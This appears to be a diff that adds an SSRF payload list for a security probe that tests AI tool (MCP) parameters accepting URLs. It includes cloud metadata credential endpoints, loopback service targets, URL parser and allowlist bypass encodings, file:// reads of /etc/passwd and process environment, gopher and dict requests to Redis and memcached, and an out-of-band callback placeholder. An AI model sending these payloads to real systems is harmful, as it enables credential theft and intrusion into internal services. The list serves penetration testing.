@@ -1,0 +1,45 @@
+# MCP05 — SSRF / URL-fetch targets for tool parameters that take a URL or host.
+# Used by artemis/scripts/mcp-probe.sh (mode: ssrf) and mcp-confirm.py.
+#
+# Placeholders substituted by the probe at fire time:
+#   {{OOB}}   full out-of-band callback URL (proves the server's egress reached us)
+#
+# Cloud metadata endpoints hold short-lived credentials — a readable hit is High.
+# One payload per line.
+
+# ── Out-of-band egress proof (blind — confirm the server fetched our URL) ──
+{{OOB}}
+
+# ── Cloud instance metadata (IMDS) — credential theft surface ──
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://[fd00:ec2::254]/latest/meta-data/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata/computeMetadata/v1/
+http://100.100.100.200/latest/meta-data/
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+# ── Loopback / internal services ──
+http://127.0.0.1/
+http://127.0.0.1:80/
+http://127.0.0.1:22/
+http://127.0.0.1:6379/
+http://127.0.0.1:8080/
+http://localhost/
+http://[::1]/
+http://0.0.0.0/
+
+# ── Allowlist / parser bypass forms ──
+http://127.0.0.1#@example.com/
+http://example.com@127.0.0.1/
+http://127.1/
+http://2130706433/
+http://0x7f000001/
+http://①②⑦.⓪.⓪.①/
+
+# ── Non-HTTP schemes (SSRF -> file/gopher/etc.) ──
+file:///etc/passwd
+file:///proc/self/environ
+gopher://127.0.0.1:6379/_INFO
+dict://127.0.0.1:11211/stats
